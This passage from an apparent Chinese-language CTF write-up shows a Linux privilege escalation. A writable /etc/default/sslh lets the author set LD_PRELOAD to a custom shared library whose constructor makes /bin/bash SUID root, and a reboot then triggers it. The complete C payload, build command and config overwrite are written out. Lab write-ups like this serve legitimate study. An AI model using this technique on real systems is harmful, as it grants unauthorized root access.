那如果我改一个开机自启动的服务呢，发现这个 /etc/default/sslh 可写

![image-20260329221912403](/assets/img/posts/twice/image-20260329221912403.png)

问题在于虽然这个环境变量的文件可写，但是只有 DAEMON_OPTS 会参与 ExecStart 的参数展开，也就是说，我既没有办法直接把 DAEMON 改了，也好像没有办法在 sslh 的参数里拼接命令

虽然运行参数改不了，但是这个文件的每个键值对都会被加载到这个程序的运行变量中，而 `/usr/sbin/sslh` 是动态链接程序，动态链接程序在启动时，会先由动态加载器 `ld-linux` 处理这些环境变量；`LD_PRELOAD` 的作用就是：

**在正常依赖库之前，先把你指定的共享库加载进进程。**

因此可以编写一个恶意共享库，在其 constructor 中执行提权操作

```bash
cat > /home/cyl-love/x.c <<'EOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor))
static void init(void) {
    chown("/bin/bash", 0, 0);
    chmod("/bin/bash", 04755);
}
EOF

gcc -shared -fPIC -o /home/cyl-love/x.so /home/cyl-love/x.c

cat > /etc/default/sslh <<'EOF'
LD_PRELOAD=/home/cyl-love/x.so
DAEMON=/usr/sbin/sslh
DAEMON_OPTS="--user root --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --http 127.0.0.1:80 --pidfile /var/run/sslh/sslh.pid"
EOF

sudo /usr/sbin/reboot
```
